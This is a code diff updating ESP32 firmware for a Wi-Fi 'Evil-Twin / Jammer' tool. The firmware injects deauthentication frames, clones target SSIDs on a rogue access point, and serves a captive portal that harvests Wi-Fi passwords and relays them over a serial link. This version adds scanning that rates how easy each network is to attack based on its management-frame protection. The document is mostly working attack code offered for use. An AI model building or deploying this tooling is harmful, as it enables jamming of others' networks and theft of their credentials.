@@ -1,21 +1,19 @@
 /* =========================================================
-   ESP32 Evil-Twin / Jammer v6.2 — Airtime & Injection Optimized
+   ESP32 Evil-Twin / Jammer v6.3 — Dual MCU Bridge & PMF Optimized
    ========================================================= */
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
 #include <esp_wifi.h>
 
-#define CTRL_SSID "JAM-CTL"
-#define CTRL_PASS "jammer1234"
-#define CTRL_PORT 8080
+#define CTL Serial2
 #define MAXT      6
 #define MAXSCAN   40
 #define MAXCLI    20
 #define AP_MAXCONN 4
 #define QN        48
 
-struct ScanEnt { char ssid[33]; uint8_t bssid[6]; int32_t rssi; uint8_t ch; uint8_t enc; };
+struct ScanEnt { char ssid[33]; uint8_t bssid[6]; int32_t rssi; uint8_t ch; uint8_t enc; uint8_t pmf; };
 ScanEnt scanList[MAXSCAN]; int scanCount = 0;
 
 struct Target { uint8_t bssid[6]; char ssid[33]; uint8_t slen; uint8_t ch; };
@@ -30,21 +28,17 @@ volatile uint8_t dupCount = 4;
 volatile uint32_t txOk = 0, txFail = 0, fakeSent = 0;
 uint8_t apCh = 1, apMac[6]; uint16_t seqNo = 0;
 
-WebServer web(80); DNSServer dns; WiFiServer ctl(CTRL_PORT); WiFiClient ctlClient;
+WebServer web(80); DNSServer dns;
 
 char qbuf[QN][100]; volatile uint8_t qh = 0, qt = 0;
 void flushQ() {
-  while (qt != qh && ctlClient && ctlClient.connected()) {
-    ctlClient.write((const uint8_t*)qbuf[qt], strlen(qbuf[qt])); ctlClient.write('\n');
-    qt = (qt + 1) % QN;
-  }
+  while (qt != qh) { CTL.write((const uint8_t*)qbuf[qt], strlen(qbuf[qt])); CTL.write('\n'); qt = (qt + 1) % QN; }
 }
 void ev(const String &s) {
   uint8_t n = (qh + 1) % QN;
   if (n == qt) qt = (qt + 1) % QN;
   strncpy(qbuf[qh], s.c_str(), 99); qbuf[qh][99] = 0;
-  qh = n;
-  if (ctlClient && ctlClient.connected()) flushQ();
+  qh = n; flushQ();
 }
 
 void apSetSSID(const char *ssid) {
@@ -71,11 +65,14 @@ const char *encName(uint8_t e) {
     default: return "?";
   }
 }
-const char *diffTag(uint8_t e) {
-  if (e <= 1) return "EASY";
-  if (e <= 4) return "GOOD";
-  if (e == 7) return "MIXED";
-  return "HARD";
+
+const char *diffTag(const ScanEnt &e) {
+  if (e.enc <= 1) return "YES";
+  if (e.enc == 6) return "NO";
+  if (e.enc == 5) return "MAYBE";
+  if (e.pmf & 0x02) return "NO";
+  if (e.pmf & 0x01) return "MAYBE";
+  return "YES";
 }
 
 int mkDeauth(uint8_t *f, const uint8_t *da, const uint8_t *sa, const uint8_t *b, uint8_t rs) {
@@ -83,6 +80,7 @@ int mkDeauth(uint8_t *f, const uint8_t *da, const uint8_t *sa, const uint8_t *b,
   f[0] = 0xC0; memcpy(&f[4], da, 6); memcpy(&f[10], sa, 6); memcpy(&f[16], b, 6); f[24] = rs;
   return 26;
 }
+
 int mkBeacon(uint8_t *b, const uint8_t *bs, const char *ss, uint8_t sl, uint8_t ch, bool probe, const uint8_t *da) {
   memset(b, 0, 100);
   b[0] = probe ? 0x50 : 0x80;
@@ -102,15 +100,6 @@ int mkBeacon(uint8_t *b, const uint8_t *bs, const char *ss, uint8_t sl, uint8_t 
 uint8_t injIf = WIFI_IF_AP;
 inline void inj(uint8_t *f, int n) {
   if (esp_wifi_80211_tx((wifi_interface_t)injIf, f, n, false) == ESP_OK) txOk++; else txFail++;
-}
-void injProbe() {
-  uint8_t f[26]; const uint8_t bc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-  mkDeauth(f, bc, tg[0].bssid, tg[0].bssid, 7);
-  uint32_t a = 0, b = 0;
-  for (int i = 0; i < 20; i++) if (esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false) == ESP_OK) a++;
-  for (int i = 0; i < 20; i++) if (esp_wifi_80211_tx(WIFI_IF_AP,  f, 26, false) == ESP_OK) b++;
-  injIf = (a >= b) ? WIFI_IF_STA : WIFI_IF_AP;
-  ev("EV INJ sta=" + String(a) + " ap=" + String(b) + " use=" + (injIf == WIFI_IF_STA ? "STA" : "AP"));
 }
 
 int cliFind(const uint8_t *m) {
@@ -273,11 +262,6 @@ void hardStop() {
   esp_wifi_set_promiscuous(false);
   WiFi.softAPdisconnect(true);
 }
-void backToCtrl() {
-  WiFi.mode(WIFI_AP_STA); apCh = 1;
-  esp_wifi_set_channel(apCh, WIFI_SECOND_CHAN_NONE);
-  WiFi.softAP(CTRL_SSID, CTRL_PASS, apCh, 0, AP_MAXCONN);
-}
 
 void handleSubmit() {
   if (tcount == 0) { web.send(200, "text/html", page("WiFi", "<p>টার্গেট নেই</p>")); return; }
@@ -288,12 +272,9 @@ void handleSubmit() {
 
   if (ok) {
     ev("EV DONE " + ssid + " " + pw);
-    web.send(200, "text/html", page(ssid, "<p style='color:#3fb950'>✔ পাসওয়ার্ড সঠিক — কানেক্টেড</p>"));
+    web.send(200, "text/html", page(ssid, "<p style='color:#3fb950'>✔ পাসওয়ার্ড সঠিক — কানেক্টেed</p>"));
     vTaskDelay(1500 / portTICK_PERIOD_MS);
     hardStop();
-    vTaskDelay(2500 / portTICK_PERIOD_MS);
-    backToCtrl();
-    flushQ();
   } else {
     apSetSSID(tg[idx].ssid);
     web.send(200, "text/html", page(ssid,
@@ -303,20 +284,58 @@ void handleSubmit() {
   }
 }
 
+struct PmfEnt { uint8_t b[6]; uint8_t f; };
+PmfEnt pmfTab[40]; int pmfN = 0;
+
+IRAM_ATTR void scanSniff(void *buf, wifi_promiscuous_pkt_type_t t) {
+  const wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
+  if (p->rx_ctrl.sig_len < 40) return;
+  const uint8_t *m = p->payload;
+  if ((m[0] & 0xFC) != 0x80) return;
+  const uint8_t *ie = m + 36, *end = m + p->rx_ctrl.sig_len;
+  while (ie + 2 <= end) {
+    uint8_t id = ie[0], ln = ie[1];
+    if (id == 48 && ln >= 8 && ie + 2 + ln <= end) {
+      const uint8_t *b = ie + 2; int q = 2 + 4;
+      if (q + 2 > ln) return;
+      q += 2 + (b[q] | (b[q+1] << 8)) * 4;
+      if (q + 2 > ln) return;
+      q += 2 + (b[q] | (b[q+1] << 8)) * 4;
+      if (q + 2 > ln) return;
+      uint8_t caps = b[q];
+      if (pmfN < 40) { memcpy(pmfTab[pmfN].b, m + 16, 6); pmfTab[pmfN].f = caps; pmfN++; }
+      return;
+    }
+    ie += 2 + ln;
+  }
+}
+
 void doScan() {
   bool was = attacking; attacking = false; hold = true;
   esp_wifi_set_promiscuous(false);
   ev("EV SCAN start");
+  pmfN = 0;
+  wifi_promiscuous_filter_t mf = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
+  esp_wifi_set_promiscuous_filter(&mf);
+  esp_wifi_set_promiscuous_rx_cb(&scanSniff);
+  esp_wifi_set_promiscuous(true);
+
   WiFi.scanDelete(); int n = WiFi.scanNetworks(false, false); scanCount = 0;
+  
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  esp_wifi_set_promiscuous(false);
+
   for (int i = 0; i < n && scanCount < MAXSCAN; i++) {
     if (WiFi.SSID(i).length() == 0) continue;
     ScanEnt &e = scanList[scanCount];
     strncpy(e.ssid, WiFi.SSID(i).c_str(), 32); e.ssid[32] = 0;
     memcpy(e.bssid, WiFi.BSSID(i), 6);
     e.rssi = WiFi.RSSI(i); e.ch = WiFi.channel(i); e.enc = WiFi.encryptionType(i);
+    e.pmf = 0;
+    for (int k = 0; k < pmfN; k++) if (!memcmp(pmfTab[k].b, e.bssid, 6)) { e.pmf = pmfTab[k].f; break; }
     scanCount++;
     ev("AP " + String(scanCount - 1) + " " + String(e.rssi) + " " + String(e.ch) + " " +
-       String(e.enc) + " " + encName(e.enc) + " " + diffTag(e.enc) + " " + String(e.ssid));
+       String(e.enc) + " " + encName(e.enc) + " " + diffTag(e) + " " + String(e.ssid));
   }
   WiFi.scanDelete();
   ev("EV SCAN end");
@@ -327,21 +346,11 @@ void handleCmd(String line) {
   line.trim(); if (!line.length()) return;
   if (line == "PING") { ev("PONG"); return; }
   if (line == "SCAN") { doScan(); return; }
-  if (line == "TX") { ev("EV TX " + String(txOk) + " " + String(txFail) + " " + String(fakeSent) + " " + String(WiFi.softAPgetStationNum()) + " inj=" + (injIf == WIFI_IF_STA ? "STA" : "AP")); return; }
+  if (line == "TX") { ev("EV TX " + String(txOk) + " " + String(txFail) + " " + String(fakeSent) + " " + String(WiFi.softAPgetStationNum())); return; }
   if (line == "BF0") { bfloodOn = false; return; }
   if (line == "BF1") { bfloodOn = true; return; }
   if (line.startsWith("DUP ")) { dupCount = constrain(line.substring(4).toInt(), 0, 40); ev("EV DUP " + String(dupCount)); return; }
-  if (line == "STOP") { hardStop(); vTaskDelay(1200); backToCtrl(); hold = false; ev("EV STOPPED"); return; }
-
-  if (line.startsWith("PREP ")) {
-    int idx = line.substring(5).toInt();
-    if (idx < 0 || idx >= scanCount) { ev("EV ERR idx"); return; }
-    apCh = scanList[idx].ch;
-    esp_wifi_set_channel(apCh, WIFI_SECOND_CHAN_NONE);
-    WiFi.setSleep(false);
-    ev("EV PREP ch" + String(apCh));
-    return;
-  }
+  if (line == "STOP") { hardStop(); hold = false; ev("EV STOPPED"); return; }
 
   if (line.startsWith("START ")) {
     String rest = line.substring(6); tcount = 0; int p = 0;
@@ -359,6 +368,8 @@ void handleCmd(String line) {
     if (!tcount) { ev("EV ERR no-target"); return; }
 
     cliN = 0; rotIdx = 0; assocIdx = 0; rotOn = (tcount > 1);
+    apCh = tg[0].ch;
+    esp_wifi_set_channel(apCh, WIFI_SECOND_CHAN_NONE);
     esp_wifi_set_max_tx_power(78);
     esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);
     apSetSSID(tg[0].ssid);
@@ -367,8 +378,6 @@ void handleCmd(String line) {
     esp_wifi_set_promiscuous_filter(&fl);
     esp_wifi_set_promiscuous_rx_cb(&sniffer);
     esp_wifi_set_promiscuous(true);
-
-    injProbe();
 
     txOk = txFail = fakeSent = 0; hold = false; attacking = true;
     ev("EV STARTED " + String(tcount) + " ch" + String(apCh));
@@ -380,17 +389,17 @@ void handleCmd(String line) {
 
 void setup() {
   Serial.begin(115200); delay(800);
-  WiFi.persistent(false); WiFi.mode(WIFI_AP_STA); WiFi.setSleep(false);
+  CTL.begin(115200, SERIAL_8N1, 16, 17);
+  WiFi.persistent(false); WiFi.mode(WIFI_AP); WiFi.setSleep(false);
   wifi_country_t cn = {.cc = "BD", .schan = 1, .nchan = 13, .max_tx_power = 20, .policy = WIFI_COUNTRY_POLICY_MANUAL};
   esp_wifi_set_country(&cn);
   apCh = 1;
-  WiFi.softAP(CTRL_SSID, CTRL_PASS, apCh, 0, AP_MAXCONN);
   esp_wifi_get_mac(WIFI_IF_AP, apMac);
   esp_wifi_set_max_tx_power(78);
   delay(400);
-  dns.start(53, "*", WiFi.softAPIP());
+  dns.start(53, "*", IPAddress(192,168,4,1));
   web.on("/", handleRoot); web.on("/submit", HTTP_POST, handleSubmit); web.onNotFound(handleRoot);
-  web.begin(); ctl.begin();
+  web.begin();
   xTaskCreatePinnedToCore(attackTask, "atk", 4096, NULL, 4, NULL, 1);
   xTaskCreatePinnedToCore(statusTask, "st",  4096, NULL, 2, NULL, 1);
   xTaskCreatePinnedToCore(rotateTask, "rot", 4096, NULL, 2, NULL, 1);
@@ -399,15 +408,10 @@ void setup() {
 String rxBuf;
 void loop() {
   dns.processNextRequest(); web.handleClient();
-  if (!ctlClient || !ctlClient.connected()) {
-    ctlClient = ctl.available(); rxBuf = "";
-    if (ctlClient) { flushQ(); ev("EV HELLO"); }
-  } else {
-    while (ctlClient.available()) {
-      char c = ctlClient.read();
-      if (c == '\n') { handleCmd(rxBuf); rxBuf = ""; }
-      else if (c != '\r' && rxBuf.length() < 200) rxBuf += c;
-    }
+  while (CTL.available()) {
+    char c = CTL.read();
+    if (c == '\n') { handleCmd(rxBuf); rxBuf = ""; }
+    else if (c != '\r' && rxBuf.length() < 200) rxBuf += c;
   }
   static int lastSta = 0; int now = WiFi.softAPgetStationNum();
   if (now > lastSta && attacking && tcount > 0) {
